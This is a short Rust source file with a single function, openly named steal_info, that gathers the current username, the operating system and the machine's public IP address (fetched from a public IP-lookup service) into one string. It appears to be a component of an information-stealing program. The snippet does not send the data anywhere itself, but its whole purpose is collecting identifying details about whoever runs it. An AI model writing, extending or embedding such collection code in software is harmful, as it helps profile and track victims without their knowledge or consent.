use std::env;
use reqwest::blocking::get;

pub fn steal_info() -> String {
    let username = env::var("USERNAME").unwrap_or_else(|_| env::var("USER").unwrap_or("unknown".into()));
    let os = env::consts::OS;
    let ip = get("https://api.ipify.org")
        .and_then(|r| r.text())
        .unwrap_or_else(|_| "unknown".into());
    format!("User: {}\nOS: {}\nIP: {}", username, os, ip)
}